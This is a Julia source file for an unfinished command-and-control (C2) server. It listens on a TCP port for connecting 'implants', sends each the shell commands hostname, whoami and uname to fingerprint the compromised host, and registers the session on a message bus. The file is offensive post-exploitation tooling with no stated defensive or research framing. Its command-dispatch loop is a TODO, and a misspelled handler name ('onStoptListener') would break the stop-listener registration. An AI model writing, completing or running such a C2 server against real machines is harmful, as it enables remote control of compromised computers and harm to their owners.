using UUIDs
using Sockets


function sendCommand(conn, cmd::String)
    @debug " 📥 sending '$cmd'"
    write(conn, "$cmd\n")
    response = readline(conn)
    @debug "Got '$response'"
    return response
end

function handleNewImplant(conn, bus :: MessageBus, listenerId::String, commandsChannel :: Channel)
    id = string(uuid4())
    println("New implant connected $id")

    hostname = sendCommand(conn, "hostname")
    user = sendCommand(conn, "whoami")
    os = inferOS(sendCommand(conn, "uname"))

    publish!(bus, SessionStarted(id=id, listenerId=listenerId, hostname=hostname, user=user, os=os))
    while !eof(conn)
        # TODO get commands from channel
        msg = readline(conn)
    end

    println("done with implant $id")
end

function inferOS(os::String) :: AbstractString
    os = lowercase(os)
    if contains(os, "darwin")
        return "macOS"
    elseif contains(os, "linux")
        return "Linux"
    elseif contains(os, "win")
        return "Windows"
    end
    return "Unknown"
end

function onStartListener(ev::StartListener, bus:: MessageBus)
    listenerId = string(uuid4())
    @info "Start C2 listener ($listenerId) on port $(ev.port)"

    # HTTP.serve!(handleNewImplant, "0.0.0.0",ev.port; async=true)
    listenerTask = errormonitor(@async begin
        server = Sockets.listen(ev.port)
        while true # TODO maybe create Event to stop  here and return the event as result event from this fn, so the event can be set somewhere else
            sock = Sockets.accept(server)
            ch = Channel{String}(32)
            errormonitor(@async handleNewImplant(sock, bus, listenerId, ch))
        end
        @warn "Listener stopped"
    end)
    return ListenerReady(listenerId, ev.port, listenerTask)
end

function onStopListener(ev::StopListener, channel:: Channel)
    # TODO stop listener
    return ListenerStopped(ev.listenerId)
end

function startC2(bus:: MessageBus)
    # start out with one listener out of the box
    ev = onStartListener(StartListener(), bus)
    publish!(bus, ev)

    register!(bus, StartListener, (ev) -> onStartListener(ev, bus))
    register!(bus, StopListener, (ev) -> onStoptListener(ev, bus))
end 